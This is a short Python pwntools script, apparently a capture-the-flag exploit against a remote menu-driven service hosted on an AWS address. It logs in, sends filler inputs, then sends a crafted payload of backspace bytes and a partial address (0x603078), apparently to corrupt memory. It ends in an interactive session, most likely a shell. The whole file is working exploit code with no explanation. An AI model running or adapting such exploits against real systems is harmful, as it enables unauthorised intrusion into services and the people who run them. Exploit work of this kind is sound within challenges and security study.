from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('ec2-13-125-131-113.ap-northeast-2.compute.amazonaws.com',PORT)
def k(dat):
  time.sleep(0.8)
  s.send(dat)
  
s.recvuntil(':')
s.sendline('1234')
s.recvuntil(':')
s.sendline('1234')
for i in range(0x10):
  k("A\n")
for i in range(21):
  k("duck\n")
print s.recvuntil('>')
raw_input()
s.send("\x7f"*2+p8(0xa3)+"\x7f"*(2+8)+p32(0x603078)[0:3]+"\n")
s.interactive()
